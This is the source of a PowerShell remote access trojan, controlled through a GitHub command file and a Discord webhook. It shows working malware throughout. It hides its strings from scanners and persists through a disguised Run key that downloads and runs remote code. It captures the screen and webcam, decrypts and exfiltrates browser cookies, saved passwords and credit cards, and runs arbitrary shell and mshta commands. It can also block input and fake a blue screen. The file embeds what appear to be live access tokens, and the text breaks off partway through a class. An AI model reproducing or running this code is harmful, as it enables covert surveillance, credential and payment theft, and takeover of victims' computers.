# rat.ps1 — Discord C2 RAT agent
# Polls a command file on GitHub API, executes, reports to a Discord webhook.

# ---- Config (strings split to dodge static scanning) ----
$C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
$T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
$RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
$W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
$S=Join-Path $env:TEMP 'r_s.tmp'
$script:P=2000
$L='1523845613177929828'
$HF=Join-Path $env:TEMP 'rat_hook.txt'
$CG='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
$WG=$W

# ---- dedup: exit if another rat.ps1 is already running ----
try{
  $me=[Diagnostics.Process]::GetCurrentProcess().Id
  $dup=Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*rat.ps1*' -and $_.ProcessId -ne $me }
  if($dup){ exit }
}catch{}

# ---- HTTP helpers ----
function Post($text){
  try{
    $t=[string]$text
    $n=1900
    if($t.Length -le $n){ $r = Post-One $t }
    else{
      $r=$true
      for($i=0; $i -lt $t.Length; $i+=$n){
        $x = Post-One $t.Substring($i,[Math]::Min($n,$t.Length-$i))
        if(-not $x){ $r=$false }
      }
    }
    return $r
  }catch{ return $false }
}

function Post-One($text){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('Content-Type','application/json')
    $b=@{'content'=$text}|ConvertTo-Json -Compress
    [void]$wc.UploadString($W,'POST',$b)
    $wc.Dispose()
    return $true
  }catch{ return $false }
}

function Upload-File($path){
  try{
    $bn=[Guid]::NewGuid().ToString()
    $fb=[IO.File]::ReadAllBytes($path)
    $fn=Split-Path $path -Leaf
    $pre="--$bn`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fn`"`r`nContent-Type: application/octet-stream`r`n`r`n"
    $post="`r`n--$bn--`r`n"
    $enc=[Text.Encoding]::ASCII
    $body=New-Object byte[] ($enc.GetByteCount($pre)+$fb.Length+$enc.GetByteCount($post))
    [Array]::Copy($enc.GetBytes($pre),0,$body,0,$enc.GetByteCount($pre))
    [Array]::Copy($fb,0,$body,$enc.GetByteCount($pre),$fb.Length)
    [Array]::Copy($enc.GetBytes($post),0,$body,$enc.GetByteCount($pre)+$fb.Length,$enc.GetByteCount($post))
    $req=[Net.HttpWebRequest]::Create($W)
    $req.Method='POST'
    $req.ContentType="multipart/form-data; boundary=$bn"
    $req.ContentLength=$body.Length
    $rs=$req.GetRequestStream()
    $rs.Write($body,0,$body.Length); $rs.Close()
    $resp=$req.GetResponse(); $resp.Close()
  }catch{}
}

# ---- Screenshot ----
function Shot(){
  try{
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $b=[System.Drawing.Rectangle]::FromLTRB(0,0,[System.Windows.Forms.SystemInformation]::VirtualScreen.Width,[System.Windows.Forms.SystemInformation]::VirtualScreen.Height)
    $bmp=New-Object Drawing.Bitmap $b.Width,$b.Height
    $g=[Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
    $p=Join-Path $env:TEMP ('s_'+[Guid]::NewGuid().ToString('N')+'.png')
    $bmp.Save($p,[Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    Upload-File $p
    Remove-Item $p -Force -EA 0
  }catch{}
}

# ---- Persist ----
function Persist{
  try{
    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
    Post '`[+] persistence enabled`'
  }catch{}
}

# ---- Shutdown ----
function Shutdown-Machine{
  try{
    Post '`[+] shutting down now`'
    Start-Sleep 1
    shutdown /s /t 0
  }catch{}
}

# ---- Wallpaper ----
function Set-Wallpaper($url){
  try{
    $p=Join-Path $env:TEMP 'w.jpg'
    (New-Object Net.WebClient).DownloadFile($url,$p)
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $p
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value '0'
    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True
    Post "`[+] wallpaper set: $url"
  }catch{ Post '`[!] wallpaper failed' }
}

# ---- System recon ----
function Get-Info{
  try{
    $os=Get-CimInstance Win32_OperatingSystem
    $cs=Get-CimInstance Win32_ComputerSystem
    $cpu=Get-CimInstance Win32_Processor
    $gpu=Get-CimInstance Win32_VideoController
    $bb=Get-CimInstance Win32_BaseBoard
    $bios=Get-CimInstance Win32_BIOS
    $ip=(Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
    if(-not $ip){ $ip=(Get-CimInstance Win32_NetworkAdapterConfiguration -EA 0 | Where-Object {$_.IPAddress} | Select-Object -First 1).IPAddress[0] }
    $up=((Get-Date)-$os.LastBootUpTime)
    $upstr="{0}d {1}h {2}m" -f $up.Days,$up.Hours,$up.Minutes
    $disks=Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
    $ramGB=[math]::Round($cs.TotalPhysicalMemory/1GB,1)
    $ramFree=[math]::Round($os.FreePhysicalMemory/1MB,1)
    $procs=Get-Process | Sort-Object CPU -Descending | Select-Object -First 25 | ForEach-Object { "{0,-6} {1,-32} CPU={2}s WS={3}MB" -f $_.Id,$_.ProcessName,[math]::Round($_.CPU,1),[math]::Round($_.WS/1MB,0) }
    $soft=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA 0 | Where-Object {$_.DisplayName} | Select-Object -ExpandProperty DisplayName -Unique | Sort-Object) -join ', '
    $o=@()
    $o+="HOSTNAME  : $($cs.Name)"
    $o+="USERNAME  : $env:USERNAME"
    $o+="DOMAIN    : $env:USERDOMAIN"
    $o+="IP        : $ip"
    $o+="OS        : $($os.Caption) ($($os.Version)) $($os.OSArchitecture)"
    $o+="UPTIME    : $upstr"
    $o+="CPU       : $($cpu.Name) ($($cpu.NumberOfCores)C/$($cpu.NumberOfLogicalProcessors)T)"
    $o+="RAM       : $ramGB GB total / $ramFree GB free"
    $o+="GPU       : $($gpu.Name) ($([math]::Round($gpu.AdapterRAM/1MB,0)) MB)"
    $o+="BOARD     : $($bb.Manufacturer) $($bb.Product)"
    $o+="BIOS      : $($bios.Manufacturer) $($bios.SMBIOSBIOSVersion)"
    $o+="DISKS     :"
    foreach($d in $disks){ $o+="  $($d.DeviceID) $([math]::Round($d.Size/1GB,1)) GB total / $([math]::Round($d.FreeSpace/1GB,1)) GB free" }
    $o+="PROCS (top25):"
    $o+=$procs
    $o+="SOFTWARE  : $soft"
    Post ($o -join "`n")
  }catch{}
}

# ---- Cookies ----
function Get-Cookies($browser){
  try{
    Add-Type -AssemblyName System.Security
    $b=$browser.ToLower()
    $bases=@{
      'chrome'="$env:LOCALAPPDATA\Google\Chrome\User Data"
      'edge'="$env:LOCALAPPDATA\Microsoft\Edge\User Data"
      'brave'="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
      'opera'="$env:APPDATA\Opera Software\Opera Stable"
      'firefox'="$env:APPDATA\Mozilla\Firefox\Profiles"
    }
    if(-not $bases[$b]){ Post "`[!] browser: chrome/firefox/edge/brave/opera"; return }
    $cookies=@()
    if($b -eq 'firefox'){
      $prof=Get-ChildItem $bases[$b] -Directory -EA 0 | Where-Object { Test-Path (Join-Path $_.FullName 'cookies.sqlite') } | Select-Object -First 1
      if(-not $prof){ Post '`[!] no firefox cookies found'; return }
      $src=Join-Path $prof.FullName 'cookies.sqlite'
      $dst=Join-Path $env:TEMP 'ff_cookies.sqlite'
      Copy-Item $src $dst -Force -EA 0
      $raw=[IO.File]::ReadAllText($dst,[Text.Encoding]::GetEncoding('ISO-8859-1'))
      $re=[regex]'(?s)([a-zA-Z0-9\.\-]{3,120}\.[a-zA-Z]{2,12})\x00(.{1,90}?)\x00(.{1,512}?)\x00'
      foreach($m in $re.Matches($raw)){
        $host=$m.Groups[1].Value
        $name=$m.Groups[2].Value
        $val=$m.Groups[3].Value
        if($host -match '\.' -and $name -match '^[a-zA-Z0-9_\-\.=]{1,90}$'){
          $cookies += [pscustomobject]@{host=$host;name=$name;value=$val}
        }
      }
    } else {
      $base=$bases[$b]
      $cand=@((Join-Path $base 'Default\Network\Cookies'),(Join-Path $base 'Default\Cookies'),(Join-Path $base 'Profile 1\Network\Cookies'))
      $src=$cand | Where-Object { Test-Path $_ } | Select-Object -First 1
      if(-not $src){ Post "`[!] no $b cookies found"; return }
      $dst=Join-Path $env:TEMP 'ch_cookies.db'
      Copy-Item $src $dst -Force -EA 0
      $bytes=[IO.File]::ReadAllBytes($dst)
      $raw=[Text.Encoding]::GetEncoding('ISO-8859-1').GetString($bytes)
      $re=[regex]'([a-zA-Z0-9\.\-]{2,120}\.[a-zA-Z]{2,12})([a-zA-Z0-9_\-\.=]{1,64})/'
      $seen=@{}
      foreach($m in $re.Matches($raw)){
        $host=$m.Groups[1].Value
        $name=$m.Groups[2].Value
        if($host -notmatch '\.[a-zA-Z]{2,12}$'){ continue }
        $key="$host|$name"
        if($seen.ContainsKey($key)){ continue }
        $seen[$key]=$true
        # try v10/v11 DPAPI decrypt on the bytes following the match
        $val='(encrypted)'
        $after=$raw.Substring($m.Index + $m.Length)
        $v=[regex]'(v10|v11)([\x00-\xff]{8,600})'
        $vm=$v.Match($after)
        if($vm.Success){
          $enc=[Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($vm.Groups[2].Value)
          try{ $val=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser')) }catch{}
        }
        $cookies += [pscustomobject]@{host=$host.TrimStart('.');name=$name;value=$val}
      }
      Remove-Item $dst -Force -EA 0
    }
    if($cookies.Count -eq 0){ Post "`[!] no cookies extracted from $b"; return }
    $json=$cookies | ConvertTo-Json -Compress
    $b64=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))
    $hdr="`[COOKIES] $b ($($cookies.Count))`n"
    Post ($hdr + $b64)
  }catch{ Post '`[!] cookie extraction failed' }
}

# ---- MSHTA ----
function Run-Mshta($payload){
  try{
    if($payload -match '^https?://'){ Start-Process mshta.exe -ArgumentList $payload -WindowStyle Hidden }
    else{
      $p=Join-Path $env:TEMP 'm.hta'
      Set-Content -Path $p -Value $payload -Force
      Start-Process mshta.exe -ArgumentList $p -WindowStyle Hidden
    }
    Post "`[+] mshta launched: $payload"
  }catch{ Post '`[!] mshta failed' }
}

# ---- Self destruct ----
function Self-Destruct{
  try{
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
    Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
    Remove-Item $HF -Force -EA 0
        Post '`[+] self destructed`'
    exit
  }catch{ exit }
}

# ---- Webcam ----
function Take-Webcam($idx){
  try{
    $idx=[int]$idx
    if($idx -lt 0){$idx=0}
    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    $asTaskAction = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncAction' })[0]
    $asTaskOp = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
    function AwaitAction($a){ $tt=$asTaskAction.Invoke($null,@($a)); $tt.Wait(-1)|Out-Null }
    function AwaitOp($a,$rt){ $at=$asTaskOp.MakeGenericMethod($rt); $nt=$at.Invoke($null,@($a)); $nt.Wait(-1)|Out-Null; $nt.Result }
    [void][Windows.Media.Capture.MediaCapture,Windows.Media,ContentType=WindowsRuntime]
    [void][Windows.Media.Capture.MediaCaptureInitializationSettings,Windows.Media,ContentType=WindowsRuntime]
    [void][Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media,ContentType=WindowsRuntime]
    [void][Windows.Storage.Streams.InMemoryRandomAccessStream,Windows.Storage.Streams,ContentType=WindowsRuntime]
    [void][Windows.Devices.Enumeration.DeviceInformation,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
    [void][Windows.Devices.Enumeration.DeviceInformationCollection,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
    $cap = New-Object Windows.Media.Capture.MediaCapture
    $settings = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
    $devs = AwaitOp ([Windows.Devices.Enumeration.DeviceInformation]::FindAllAsync([Windows.Devices.Enumeration.DeviceClass]::VideoCapture)) ([Windows.Devices.Enumeration.DeviceInformationCollection])
    if($devs.Count -gt 0){
      if($idx -ge $devs.Count){$idx=0}
      $settings.VideoDeviceId = $devs[$idx].Id
    }
    AwaitAction $cap.InitializeAsync($settings)
    $p = Join-Path $env:TEMP ('cam_'+[Guid]::NewGuid().ToString('N')+'.jpg')
    $imgProp = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
    $stream = New-Object Windows.Storage.Streams.InMemoryRandomAccessStream
    AwaitAction $cap.CapturePhotoToStreamAsync($imgProp, $stream)
    $stream.Seek(0)
    $netStream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($stream)
    $ms = New-Object IO.MemoryStream
    $netStream.CopyTo($ms)
    [IO.File]::WriteAllBytes($p, $ms.ToArray())
    Upload-File $p
    Post "[+] webcam shot (cam $idx/$($devs.Count))"
    Remove-Item $p -Force -EA 0
  }catch{ Post "[!] webcam: $($_.Exception.Message)" }
}

# ---- Blue screen ----
function Show-BlueScreen{
  try{
    $inner=@'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$f=New-Object Windows.Forms.Form
$f.FormBorderStyle='None'
$f.WindowState='Maximized'
$f.TopMost=$true
$f.BackColor=[Drawing.Color]::FromArgb(0,120,215)
$f.ControlBox=$false
$lbl=New-Object Windows.Forms.Label
$lbl.Text=":(`r`nYour PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.`r`n`r`nStop code: CRITICAL_PROCESS_DIED"
$lbl.ForeColor=[Drawing.Color]::White
$lbl.Font=New-Object Drawing.Font('Segoe UI',20)
$lbl.Dock='Fill'
$lbl.TextAlign='MiddleLeft'
$lbl.Padding=New-Object Windows.Forms.Padding(80)
$f.Controls.Add($lbl)
$f.ShowDialog()
'@
    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
    Post '`[+] blue screen shown (clears on restart)`'
  }catch{}
}

# ---- Block input (keyboard + mouse) ----
function Block-Input{
  try{
    $cs=@'
using System;
using System.Runtime.InteropServices;
public class IB {
  public delegate IntPtr P(int n, IntPtr w, IntPtr l);
  [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, P fn, IntPtr m, uint t);
  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
  [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr h, uint a, uint b);
  [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
  [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
  [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int x; public int y; }
  static P kb = Blk, ms = Blk;
  static IntPtr Blk(int n, IntPtr w, IntPtr l){ return n >= 0 ? (IntPtr)1 : CallNextHookEx(IntPtr.Zero, n, w, l); }
  public static void Start(){
    SetWindowsHookEx(13, kb, GetModuleHandle(null), 0);
    SetWindowsHookEx(14, ms, GetModuleHandle(null), 0);
    MSG m;
    while(GetMessage(out m, IntPtr.Zero, 0, 0) > 0){ TranslateMessage(ref m); DispatchMessage(ref m); }
  }
}
'@
    $inner="Add-Type -TypeDefinition @'`n$cs`n'@`n[IB]::Start()"
    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
    Post '`[+] input blocked (keyboard + mouse)`'
  }catch{ Post '`[!] block failed' }
}

# ---- Jumpscare ----
function Jump-Scare($url){
  try{
    $vol=@'
using System;
using System.Runtime.InteropServices;
public class Vol {
  [DllImport("user32.dll")] public static extern void keybd_event(byte vk, byte s, uint f, UIntPtr e);
  public static void Max(){ for(int i=0;i<50;i++){ keybd_event(0xAF,0,0,UIntPtr.Zero); keybd_event(0xAF,0,2,UIntPtr.Zero); } }
}
'@
    Add-Type -TypeDefinition $vol
    [Vol]::Max()
    if(-not $url){ $url='https://www.youtube.com/watch?v=dQw4w9WgXcQ' }
    Start-Process $url
    Post '`[+] jumpscare: volume 100% + video opened`'
  }catch{ Post '`[!] jumpscare failed' }
}

# ---- Command dispatcher ----
function Run-Cmd($c){
  try{
    if($c -eq 'block'){ Block-Input }
    elseif($c -eq 'jumpscare'){ Jump-Scare $null }
    elseif($c -like 'jumpscare:*'){ Jump-Scare ($c.Substring(10)) }
    elseif($c -like ('setup:'+$VN+':*')){
          $rest=$c.Substring(7 + $VN.Length)
      $parts=$rest -split ';', 2
      $W=$parts[0]
      $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$parts[1]
      Set-Content $HF ($W + "`n" + $parts[1]) -Force
      Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
      Shot
    }
    elseif($c -eq 'proclist'){
      $o=Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 Name,Id,@{n='CPU';e={[math]::Round($_.CPU,1)}},@{n='MB';e={[math]::Round($_.WS/1MB,1)}} | Out-String -Width 200
      Post $o
    }
    elseif($c -like 'shell:*'){
      $x=$c.Substring(6)
      $o=cmd /c $x 2>&1 | Out-String
      if([string]::IsNullOrWhiteSpace($o)){$o='(no output)'}
      Post $o
    }
    elseif($c -like 'ps:*'){
      $x=$c.Substring(3)
      $o=powershell -NoP -C $x 2>&1 | Out-String
      if([string]::IsNullOrWhiteSpace($o)){$o='(no output)'}
      Post $o
    }
    elseif($c -like 'download:*'){
      $p=$c.Substring(9).Trim()
      if(Test-Path $p){
        if((Get-Item $p).Length -gt 7MB){ Post "`[!] file too large: $p" }
        else{ $d=[Convert]::ToBase64String([IO.File]::ReadAllBytes($p)); Post "`[FILE] $p`n``````$d``````" }
      } else { Post "`[!] not found: $p" }
    }
    elseif($c -eq 'screenshot' -or $c -eq 'screen'){ Shot }
    elseif($c -eq 'persist'){ Persist }
    elseif($c -eq 'shutdown'){ Shutdown-Machine }
    elseif($c -like 'wallpaper:*'){ Set-Wallpaper ($c.Substring(10)) }
    elseif($c -eq 'info'){ Get-Info }
    elseif($c -like 'cookies:*'){ Get-Cookies ($c.Substring(8)) }
    elseif($c -eq 'cookies'){ Get-Cookies 'chrome' }
    elseif($c -like 'mshta:*'){ Run-Mshta ($c.Substring(6)) }
    elseif($c -eq 'selfdestruct'){ Self-Destruct }
    elseif($c -eq 'webcam'){ Take-Webcam 0 }
    elseif($c -like 'webcam:*'){ Take-Webcam ($c.Substring(7)) }
    elseif($c -eq 'bluescreen'){ Show-BlueScreen }
    elseif($c -like 'sleep:*'){
      $script:P=[int]$c.Substring(6)
      Post "`[+] poll set to $($script:P) ms"
    }
    elseif($c -eq 'kill'){
      Post '`[+] killed`'; exit
    }
    elseif($c -eq 'uninstall'){
          Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
          Remove-Item $HF -Force -EA 0
          Post '`[+] uninstalled`'; exit
        }
    elseif($c -eq 'passwords'){ Get-Passwords }
    elseif($c -eq 'creditcard'){ Get-CreditCards }
    elseif($c -eq 'address'){ Get-Addresses }
    elseif($c -eq 'whoami'){ Post (whoami) }
    else { Post "`[?] unknown: $c" }
  }catch{}
}



# ---- Credential + card theft ----
$script:StealLoaded = $false
function Ensure-Steal {
  if ($script:StealLoaded) { return }
  Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;

public class StealCore {
    [StructLayout(LayoutKind.Sequential)]
    public struct BLOB { public int cbData; public IntPtr pbData; }
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CryptUnprotectData(ref BLOB pDataIn, IntPtr szDesc, ref BLOB pOptional, IntPtr pvReserved, IntPtr pPrompt, int dwFlags, ref BLOB pDataOut);
    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr hMem);
    public static byte[] DPAPI(byte[] data) {
        if (data == null || data.Length == 0) return null;
        BLOB ib = new BLOB(); BLOB ob = new BLOB(); BLOB opt = new BLOB();
        ib.cbData = data.Length; ib.pbData = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, ib.pbData, data.Length);
        if (CryptUnprotectData(ref ib, IntPtr.Zero, ref opt, IntPtr.Zero, IntPtr.Zero, 0, ref ob)) {
            byte[] r = new byte[ob.cbData]; Marshal.Copy(ob.pbData, r, 0, ob.cbData);
            LocalFree(ob.pbData); Marshal.FreeHGlobal(ib.pbData); return r;
        }
        Marshal.FreeHGlobal(ib.pbData); return null;
    }
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_open(byte[] f, out IntPtr db);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_close(IntPtr db);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_prepare_v2(IntPtr db, byte[] sql, int nByte, out IntPtr stmt, IntPtr tail);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_step(IntPtr stmt);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_finalize(IntPtr stmt);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern IntPtr sqlite3_column_text(IntPtr stmt, int c);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern IntPtr sqlite3_column_blob(IntPtr stmt, int c);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_column_bytes(IntPtr stmt, int c);
    static byte[] E(string s) { return Encoding.UTF8.GetBytes(s); }
    static string T(IntPtr p, int n) { if (p == IntPtr.Zero || n <= 0) return ""; byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n); return Encoding.UTF8.GetString(b); }
    static byte[] B(IntPtr p, int n) { if (p == IntPtr.Zero || n <= 0) return null; byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n); return b; }
    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptOpenAlgorithmProvider(out IntPtr alg, string id, string impl, int flags);
    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptSetProperty(IntPtr h, string prop, byte[] val, int cb, int flags);
    [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr alg, out IntPtr key, IntPtr keyObj, int cbKeyObj, byte[] secret, int cbSecret, int flags);
    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr key, byte[] input, int cbInput, IntPtr pPadding, byte[] iv, int cbIV, byte[] output, int cbOutput, ref int pcb, int flags);
    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr key);
    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr alg, int flags);
    [StructLayout(LayoutKind.Sequential, Pack=8)]
    struct AUTH_INFO { public int cbSize; public int dwInfoVersion; public IntPtr pbNonce; public int cbNonce; public IntPtr pbAuthData; public int cbAuthData; public IntPtr pbTag; public int cbTag; public IntPtr pbMacContext; public int cbMacContext; public int cbAAD; public long cbData; public int dwFlags; }
    public static byte[] GCMDecrypt(byte[] key, byte[] nonce, byte[] ct, byte[] tag) {
        IntPtr alg = IntPtr.Zero, hKey = IntPtr.Zero, keyObj = IntPtr.Zero, nPtr = IntPtr.Zero, tPtr = IntPtr.Zero, aPtr = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out alg, "AES", null, 0) != 0) return null;
            byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            BCryptSetProperty(alg, "ChainingMode", mode, mode.Length, 0);
            int objLen = 1024; keyObj = Marshal.AllocHGlobal(objLen);
            if (BCryptGenerateSymmetricKey(alg, out hKey, keyObj, objLen, key, key.Length, 0) != 0) return null;
            nPtr = Marshal.AllocHGlobal(nonce.Length); Marshal.Copy(nonce, 0, nPtr, nonce.Length);
            tPtr = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, tPtr, tag.Length);
            AUTH_INFO a = new AUTH_INFO(); a.cbSize = Marshal.SizeOf(typeof(AUTH_INFO)); a.dwInfoVersion = 1;
            a.pbNonce = nPtr; a.cbNonce = nonce.Length; a.pbTag = tPtr; a.cbTag = tag.Length;
            aPtr = Marshal.AllocHGlobal(a.cbSize); Marshal.StructureToPtr(a, aPtr, false);
            byte[] outBuf = new byte[ct.Length]; int written = 0;
            int st = BCryptDecrypt(hKey, ct, ct.Length, aPtr, null, 0, outBuf, outBuf.Length, ref written, 0);
            if (st != 0) return null;
            byte[] r = new byte[written]; Array.Copy(outBuf, r, written); return r;
        } finally {
            if (aPtr != IntPtr.Zero) Marshal.FreeHGlobal(aPtr);
            if (nPtr != IntPtr.Zero) Marshal.FreeHGlobal(nPtr);
            if (tPtr != IntPtr.Zero) Marshal.FreeHGlobal(tPtr);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (keyObj != IntPtr.Zero) Marshal.FreeHGlobal(keyObj);
            if (alg != IntPtr.Zero) BCryptCloseAlgorithmProvider(alg, 0);
        }
    }
    public static string DecodePassword(byte[] enc, byte[] key) {
        if (enc == null || enc.Length < 20) return "";
        if (enc[0] == (byte)'v' && enc[1] == (byte)'1') {
            byte[] nonce = new byte[12]; Array.Copy(enc, 3, nonce, 0, 12);
            int ctLen = enc.Length - 3 - 12 - 16; if (ctLen < 0) return "";
            byte[] ct = new byte[ctLen]; Array.Copy(enc, 15, ct, 0, ctLen);
            byte[] tag = new byte[16]; Array.Copy(enc, enc.Length - 16, tag, 0, 16);
            byte[] k16 = new byte[16]; Array.Copy(key, 0, k16, 0, 16);
            byte[] pt = GCMDecrypt(k16, nonce, ct, tag);
            return pt == null ? "" : Encoding.UTF8.GetString(pt);
        }
        return "";
    }
    public static List<string[]> GetLogins(string db, byte[] key) {
        var rows = new List<string[]>();
        IntPtr hdb, stmt;
        if (sqlite3_open(E(db), out hdb) != 0) return rows;
        if (sqlite3_prepare_v2(hdb, E("SELECT origin_url,username_value,password_value FROM logins"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
        while (sqlite3_step(stmt) == 100) {
            string url = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
            string user = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
            byte[] enc = B(sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
            rows.Add(new string[] { url, user, enc == null ? "" : Convert.ToBase64String(enc) });
        }
        sqlite3_finalize(stmt); sqlite3_close(hdb);
        return rows;
    }
    public static List<string[]> GetCards(string db, byte[] key) {
        var rows = new List<string[]>();
        IntPtr hdb, stmt;
        if (sqlite3_open(E(db), out hdb) != 0) return rows;
        if (sqlite3_prepare_v2(hdb, E("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
        while (sqlite3_step(stmt) == 100) {
            string name = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
            string em = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
            string ey = T(sqlite3_column_text(stmt, 2), sqlite3_column_bytes(stmt, 2));
            byte[] enc = B(sqlite3_column_blob(stmt, 3), sqlite3_column_bytes(stmt, 3));
            rows.Add(new string[] { name, em + "/" + ey, enc == null ? "" : Convert.ToBase64String(enc) });
        }
        sqlite3_finalize(stmt); sqlite3_close(hdb);
        return rows;
    }
}

public class AppBound {
    [ComImport, Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IElevator {
        [PreserveSig] int RunRecoveryCRXElevated([MarshalAs(UnmanagedType.LPWStr)] string a, [MarshalAs(UnmanagedType.LPWStr)] string b, [MarshalAs(UnmanagedType.LPWStr)] string c, [MarshalAs(UnmanagedType.LPWStr)] string d, uint e, out IntPtr f);
